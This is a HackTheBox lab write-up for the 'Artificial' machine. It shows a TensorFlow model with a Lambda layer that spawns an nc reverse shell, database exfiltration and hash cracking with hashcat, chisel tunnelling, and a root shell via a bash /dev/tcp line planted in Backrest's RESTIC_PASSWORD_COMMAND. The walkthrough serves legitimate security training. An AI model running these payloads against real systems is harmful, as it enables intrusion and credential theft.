---
title: Artificial [Easy]
date: 2025-06-23
tags: [htb, linux, nmap, ssh, tensorflow, rce, backrest, chisel, hashcat, reverse shell]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/artifical-htb-season8
image: /assets/img/artifical-htb-season8/artifical-htb-season8_banner.png
---

# Artificial HTB Season 8
## Machine information
Author: [FisMatHack](https://app.hackthebox.com/users/1076236)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 00:33 EDT
Nmap scan report for artificial.htb (10.129.xx.xx)
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Artificial - AI Solutions
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.90 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.xx.xx     artificial.htb
```

Let's check out the port `80` first.

### Web Enumeration
Go to `https://artificial.htb`.

![Home Page](/assets/img/artifical-htb-season8/artifical-htb-season8_home_page.png)

So this website is about AI model building and testing with a friendly user interface.

```python
import numpy as np
import pandas as pd
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

np.random.seed(42)

# Create hourly data for a week
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

# Create a DataFrame
data = pd.DataFrame({
    'hour': hours,
    'profit': profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

# Build the model
model = keras.Sequential([
    layers.Dense(64, activation='relu', input_shape=(1,)),
    layers.Dense(64, activation='relu'),
    layers.Dense(1)
])

# Compile the model
model.compile(optimizer='adam', loss='mean_squared_error')

# Train the model
model.fit(X, y, epochs=100, verbose=1)

# Save the model
model.save('profits_model.h5')
```

They also provide a sample code for the model.

Look down and found some user.

![User](/assets/img/artifical-htb-season8/artifical-htb-season8_user.png)

Found some user: `John Doe`, `Jane Smith`, `Michael Lee`. <br>
&rarr; Maybe these are some hint that these are the users of the website and we need to find these credentials to ssh them.

Also trying to find if there is some hidden endpoint or some uncovered stuffs.

```bash
└─$ dirsearch -u http://artificial.htb/         
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB_Labs/DEPTHS_Season8/Artificial/reports/http_artificial.htb/__25-06-23_00-42-38.txt

Target: http://artificial.htb/

[00:42:38] Starting: 
[00:43:26] 302 -  199B  - /dashboard  ->  /login                            
[00:43:45] 200 -  857B  - /login                                            
[00:43:46] 302 -  189B  - /logout  ->  /                                    
[00:44:07] 200 -  952B  - /register                                         
                                                                             
Task Completed
```

So just found some endpoints: `/login`, `/register`, `/dashboard`, `/logout`.

Let's try to register a new account.

```bash
username: test123
email: test123@gmail.com
password: test123
```

![Register](/assets/img/artifical-htb-season8/artifical-htb-season8_register.png)

![Login](/assets/img/artifical-htb-season8/artifical-htb-season8_login.png)

![Dashboard](/assets/img/artifical-htb-season8/artifical-htb-season8_dashboard.png)

We were prompted to a page where we can see there a `Upload Model` button. They also provide `requirements.txt` and `Dockerfile` to ensure that we need to use these files in order to match their requirements when uploading the model.

Let's try to upload sample model from what they provided.

First need to download the `requirements.txt` and `Dockerfile` from the website.

```bash
└─$ cat requirements.txt 
tensorflow-cpu==2.13.1
```

```bash
└─$ cat Dockerfile      
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

Then we will use this command to run:

```bash
└─$ sudo docker run --rm -v $(pwd):/code -w /code python:3.8-slim bash -c "
pip install https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl pandas &&
python example_model.py
"
```

Then upload the `profits_model.h5` file.

![Upload Model](/assets/img/artifical-htb-season8/artifical-htb-season8_upload_model.png)

![Upload Model](/assets/img/artifical-htb-season8/artifical-htb-season8_upload_model_success.png)

When we click the `View Predictions` button, we got this:

![View Predictions](/assets/img/artifical-htb-season8/artifical-htb-season8_view_predictions.png)

Pretty nice and details.

So now, what if we modify or even create another script to reverse shell back to our kali machine? <br>
Google it our and found some articles: [Tensorflow Remote Code Execution with Malicious Model](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model) and [Tensorflow RCE](https://github.com/Splinter0/tensorflow-rce/blob/main/exploit.py).

### Tensorflow RCE
Gonna use this script from [Tensorflow RCE](https://github.com/Splinter0/tensorflow-rce/blob/main/exploit.py).

```bash
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.xx.xx.xx 3333 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

> Just modified the IP address and port to our own `tun0` and favor `port` you want.

Then run this command to generate the `exploit.h5` file:

```bash
└─$ sudo docker run --rm -v $(pwd):/code -w /code python:3.8-slim bash -c "
pip install https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl &&
python reverse_shell_tensorflow.py
"
```

Upload the `exploit.h5` file to the website and click the `View Predictions` button. <br>
We got a reverse shell back to our kali machine.

```bash
└─$ rlwrap -cAr nc -lvnp 3333
listening on [any] 3333 ...
connect to [10.xx.xx.xx] from (UNKNOWN) [10.129.xx.xx] 41340
/bin/sh: 0: can't access tty; job control turned off
$ pwd
/home/app/app
```

### DB & Cracking
Go around and found out there is a `user.db` file in the `/home/app/app/instance` directory. <br>
&rarr; Grab it back to our kali machine.

```bash
$ cd instance
$ ls -la
total 32
drwxr-xr-x 2 app app  4096 Jun 23 15:46 .
drwxrwxr-x 7 app app  4096 Jun  9 13:56 ..
-rw-r--r-- 1 app app 24576 Jun 23 15:46 users.db
$ python3 -m http.server 8000
```

```bash
└─$ wget http://10.129.xx.xx:8000/users.db
```

Got our first, now gonna use `sqlite3` to check out the database.

```bash
└─$ sqlite3 users.db                     
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
model  user 
sqlite> select * from user;
1|gael|gael@artificial.htb|<SNIP>
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|test123|test123@gmail.com|cc03e747a6afbbcbf8be7668acfebee5
```

We gonna grab the password hash of `gael` user because when you check the `/home` directory, we will see there is a `gael` directory. <br>
&rarr; We use this [CrackStation](https://crackstation.net/) to crack the password hash.

![CrackStation](/assets/img/artifical-htb-season8/artifical-htb-season8_crackstation.png)

Got the password: `mattp005xxxxxxxxx`. <br>
&rarr; Let's ssh to `gael` user.

```bash
└─$ ssh gael@10.129.xx.xx
gael@10.129.xx.xx's password: 
gael@artificial:~$ ls -la
total 32
drwxr-x--- 4 gael gael 4096 Jun  9 08:53 .
drwxr-xr-x 4 root root 4096 Jun 18 13:19 ..
lrwxrwxrwx 1 root root    9 Oct 19  2024 .bash_history -> /dev/null
-rw-r--r-- 1 gael gael  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 gael gael 3771 Feb 25  2020 .bashrc
drwx------ 2 gael gael 4096 Sep  7  2024 .cache
-rw-r--r-- 1 gael gael  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root    9 Oct 19  2024 .python_history -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 19  2024 .sqlite_history -> /dev/null
drwx------ 2 gael gael 4096 Sep  7  2024 .ssh
-rw-r----- 1 root gael   33 Jun 23 04:31 user.txt
gael@artificial:~$ cat user.txt
e1a88axxxxxxxxxxxxxxxxxxxxxxxxxx
```

Nail the `user.txt` flag.

## Initial Access
### Backup File & Cracking
Go around and found out there is a `backrest_backup.tar.gz` in `/var/backups`.
```bash
gael@artificial:/var/backups$ ls -la
total 51972
drwxr-xr-x  2 root root       4096 Jun 23 06:25 .
drwxr-xr-x 13 root root       4096 Jun  2 07:38 ..
-rw-r--r--  1 root root      51200 Jun 23 06:25 alternatives.tar.0
-rw-r--r--  1 root root      38602 Jun  9 10:48 apt.extended_states.0
-rw-r--r--  1 root root       4253 Jun  9 09:02 apt.extended_states.1.gz
-rw-r--r--  1 root root       4206 Jun  2 07:42 apt.extended_states.2.gz
-rw-r--r--  1 root root       4190 May 27 13:07 apt.extended_states.3.gz
-rw-r--r--  1 root root       4383 Oct 27  2024 apt.extended_states.4.gz
-rw-r--r--  1 root root       4379 Oct 19  2024 apt.extended_states.5.gz
-rw-r--r--  1 root root       4367 Oct 14  2024 apt.extended_states.6.gz
-rw-r-----  1 root sysadm 52357120 Mar  4 22:19 backrest_backup.tar.gz
-rw-r--r--  1 root root        268 Sep  5  2024 dpkg.diversions.0
-rw-r--r--  1 root root        135 Sep 14  2024 dpkg.statoverride.0
-rw-r--r--  1 root root     696841 Jun  9 10:48 dpkg.status.0
```

Use the same way to transfer `users.db` file back to our kali machine. <br>
&rarr; Then will extract them out.

```bash
└─$ 7z x backrest_backup.tar.gz

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 52357120 bytes (50 MiB)

Extracting archive: backrest_backup.tar.gz
WARNING:
backrest_backup.tar.gz
Cannot open the file as [gzip] archive
The file is open as [tar] archive

--
Path = backrest_backup.tar.gz
Open WARNING: Cannot open the file as [gzip] archive
Type = tar
Physical Size = 52357120
Headers Size = 10752
Code Page = UTF-8
Characteristics = GNU ASCII

Everything is Ok

Archives with Warnings: 1
Folders: 6
Files: 13
Size:       52344483
Compressed: 52357120
```

```bash
└─$ tree .                          
.
├── backrest
├── install.sh
├── jwt-secret
├── oplog.sqlite
├── oplog.sqlite.lock
├── oplog.sqlite-shm
├── oplog.sqlite-wal
├── processlogs
│   └── backrest.log
├── restic
└── tasklogs
    ├── logs.sqlite
    ├── logs.sqlite-shm
    └── logs.sqlite-wal

3 directories, 12 files
```

```bash
└─$ ls -la
total 51092
drwxr-xr-x 5 kali kali     4096 Mar  4 17:17 .
drwxrwxr-x 5 kali kali     4096 Jun 23 12:03 ..
-rwxr-xr-x 1 kali kali 25690264 Feb 16 14:38 backrest
drwxr-xr-x 3 kali kali     4096 Mar  3 16:27 .config
-rwxr-xr-x 1 kali kali     3025 Mar  2 23:28 install.sh
-rw------- 1 kali kali       64 Mar  3 16:18 jwt-secret
-rw-r--r-- 1 kali kali    57344 Mar  4 17:13 oplog.sqlite
-rw------- 1 kali kali        0 Mar  3 16:18 oplog.sqlite.lock
-rw-r--r-- 1 kali kali    32768 Mar  4 17:17 oplog.sqlite-shm
-rw-r--r-- 1 kali kali        0 Mar  4 17:17 oplog.sqlite-wal
drwxr-xr-x 2 kali kali     4096 Mar  3 16:18 processlogs
-rwxr-xr-x 1 kali kali 26501272 Mar  2 23:28 restic
drwxr-xr-x 3 kali kali     4096 Mar  4 17:17 tasklogs
```

There is a `.config` so check them out.

```bash
└─$ cat config.json    
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "<SNIP>"
      }
    ]
  }
}
```

Found out there is a `backrest_root` user and the password hash is `<SNIP>`. <br>
Seem like this password has been base64 encoded. Let's decode it. <br>
&rarr; Use [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=SkRKaEpERXdKR05XUjBsNU9WWk5XRkZrTUdkTk5XZHBia050YW1WcE1tdGFVaTlCUTAxTmExTnpjM0JpVW5WMFdWQTFPRVZDV25vdk1GRlA) and got this `$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/<SNIP>/0QO`.

Let's crack it.

```bash
└─$ hashcat -h | grep -i bcrypt                                         
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
```

```bash
└─$ hashcat -m 3200 backrest_root.hash /usr/share/wordlists/rockyou.txt
```

```bash
└─$ hashcat -m 3200 backrest_root.hash /usr/share/wordlists/rockyou.txt --show
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/<SNIP>/0QO:<SNIP>
```

Got the password: `<SNIP>`. <br>
&rarr; Let's ssh to `backrest_root` user.

```bash
└─$ ssh backrest_root@10.129.xx.xx      
backrest_root@10.129.xx.xx's password: 
Permission denied, please try again.
```

Though that we can ssh into the `backrest_root` user, but it's not working. <br>
&rarr; Let's uncover more about `gael` user if there is some port is open.

## Privilege Escalation
### Port 9898
```bash
gael@artificial:~$ netstat -tunlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

Found an interesting port `9898`. <br>
&rarr; Let's tunnel it to our kali machine with [chisel](https://github.com/jpillora/chisel).

```bash
└─$ ./chisel server --reverse --port 9000        
2025/06/23 23:02:00 server: Reverse tunnelling enabled
2025/06/23 23:02:00 server: Fingerprint vzDtaYT87eDXCM0G4K9KCGA4O7j5AjDEHMKF32hOzuQ=
2025/06/23 23:02:00 server: Listening on http://0.0.0.0:9000
```

```bash
gael@artificial:/tmp$ ./chisel client 10.xx.xx.xx:9000 R:9898:127.0.0.1:9898
2025/06/24 03:06:21 client: Connecting to ws://10.xx.xx.xx:9000
2025/06/24 03:06:24 client: Connected (Latency 175.892494ms)
```

```bash
└─$ ./chisel server --reverse --port 9000        
2025/06/23 23:02:00 server: Reverse tunnelling enabled
2025/06/23 23:02:00 server: Fingerprint vzDtaYT87eDXCM0G4K9KCGA4O7j5AjDEHMKF32hOzuQ=
2025/06/23 23:02:00 server: Listening on http://0.0.0.0:9000
2025/06/23 23:06:23 server: session#1: tun: proxy#R:9898=>9898: Listening
```

Perfectly tunneled. Let's check out the port `9898`.

![Port 9898](/assets/img/artifical-htb-season8/artifical-htb-season8_port_9898.png)

Login with `backrest_root` user and password `<SNIP>`.

![Port 9898](/assets/img/artifical-htb-season8/artifical-htb-season8_port_9898_login.png)

![Port 9898](/assets/img/artifical-htb-season8/artifical-htb-season8_port_9898_page.png)

So they use [backrest](https://github.com/garethgeorge/backrest), which is a **web-based backup management tool** for **restic** - providing a web interface to easily manage, schedule and monitor backup repositories.

After going through the documentation, found out that in [Hooks](https://garethgeorge.github.io/backrest/docs/hooks/) section, there is `CONDITION_PRUNE_START` in [Prune Events](https://garethgeorge.github.io/backrest/docs/hooks/#prune-events). <br>
&rarr; Chance can be leverage this one to get `root.txt` flag and redirect to `/tmp` folder.

![Add Repository](/assets/img/artifical-htb-season8/artifical-htb-season8_add_repository.png)

Go to this `Repositories` section and click `Add Repo`. <br>
Then just add whatever `Repo Name` and `Repository URI` you want. Password just click on `[Generate]` button.

![Add Repository](/assets/img/artifical-htb-season8/artifical-htb-season8_add_repository_1.png)

Then the `Hooks` section, choose `CONDITION_PRUNE_START` and for the `Script` field, we will use this command:

```bash
cat /root/root.txt > /tmp/root.txt
```

![Add Repository](/assets/img/artifical-htb-season8/artifical-htb-season8_add_repository_2.png)

After finished, click the `Submit` button.

![Add Repository](/assets/img/artifical-htb-season8/artifical-htb-season8_add_repository_3.png)

Check out the `/tmp`.

```bash
gael@artificial:/tmp$ ls -al
total 8548
drwxrwxrwt 12 root root    4096 Jun 24 03:27 .
drwxr-xr-x 20 root root    4096 Jun 24 03:29 ..
-rwxrwxr-x  1 gael gael 8704000 Dec  7  2021 chisel
drwxrwxrwt  2 root root    4096 Jun 23 04:31 .font-unix
drwxrwxrwt  2 root root    4096 Jun 23 04:31 .ICE-unix
drwx------  3 root root    4096 Jun 23 04:31 systemd-private-9b718d729b934d79a2967d67fa69a377-ModemManager.service-IZm5nj
drwx------  3 root root    4096 Jun 23 04:31 systemd-private-9b718d729b934d79a2967d67fa69a377-systemd-logind.service-MOl5ui
drwx------  3 root root    4096 Jun 23 04:31 systemd-private-9b718d729b934d79a2967d67fa69a377-systemd-resolved.service-vWKXlg
drwx------  3 root root    4096 Jun 23 04:31 systemd-private-9b718d729b934d79a2967d67fa69a377-systemd-timesyncd.service-IWjdlf
drwx------  3 root root    4096 Jun 23 07:55 systemd-private-9b718d729b934d79a2967d67fa69a377-upower.service-hdGpoh
drwxrwxrwt  2 root root    4096 Jun 23 04:31 .Test-unix
drwxrwxrwt  2 root root    4096 Jun 23 04:31 .X11-unix
drwxrwxrwt  2 root root    4096 Jun 23 04:31 .XIM-unix
```

Does not have the `root.txt` file. <br>
Seems like not what I expected, but **remember** when entering the password, if we hover the mouse on the password field, there will be a small pop up window. <br>

![Password Popup](/assets/img/artifical-htb-season8/artifical-htb-season8_password_popup.png)

This one `RESTIC_PASSWORD_COMMAND` make me thinking out what if we can leverage this to reverse shell back to our kali machine. <br>
&rarr; Let's try it.

Start by `Add Repo` again. And then in the `Env Vars` section, add this:

```bash
RESTIC_PASSWORD_COMMAND=bash -c "bash -i >& /dev/tcp/10.xx.xx.xx/1337 0>&1"
```

![Add Repository](/assets/img/artifical-htb-season8/artifical-htb-season8_add_repository_4.png)

From our kali, let's start a listener.

```bash
└─$ rlwrap -cAr nc -lvnp 1337  
listening on [any] 1337 ...
```

Now, submit the new one.

```bash
└─$ rlwrap -cAr nc -lvnp 1337  
listening on [any] 1337 ...
connect to [10.xx.xx.xx] from (UNKNOWN) [10.129.xx.xx] 58626
bash: cannot set terminal process group (12312): Inappropriate ioctl for device
bash: no job control in this shell
root@artificial:/#
```

BOOM! Got the connection back.

```bash
root@artificial:/# cd /root
cd /root
root@artificial:~# ls -la
ls -la
total 36
drwx------  6 root root 4096 Jun 23 04:31 .
drwxr-xr-x 20 root root 4096 Jun 24 03:29 ..
lrwxrwxrwx  1 root root    9 Jun  9 09:37 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  4 root root 4096 Mar  3 21:52 .cache
drwxr-xr-x  3 root root 4096 Oct 19  2024 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
lrwxrwxrwx  1 root root    9 Oct 19  2024 .python_history -> /dev/null
-rw-r-----  1 root root   33 Jun 23 04:31 root.txt
drwxr-xr-x  2 root root 4096 Jun  9 13:57 scripts
drwx------  2 root root 4096 Mar  4 22:40 .ssh
root@artificial:~# cat root.txt
cat root.txt
f650c1xxxxxxxxxxxxxxxxxxxxxxxxxx
```

Successfully grab the `root.txt` flag.

A really nice and peaceful challenge from **tensorflow RCE** via upload model and escalate to `root` user from **backrest** via `RESTIC_PASSWORD_COMMAND`. Doing this challenge feeling more light and fun then the **super insane brainfuck** [sorcery](https://dudenation.github.io/posts/sorcery-htb-season8/) challenge =))).

![result](/assets/img/artifical-htb-season8/result.png)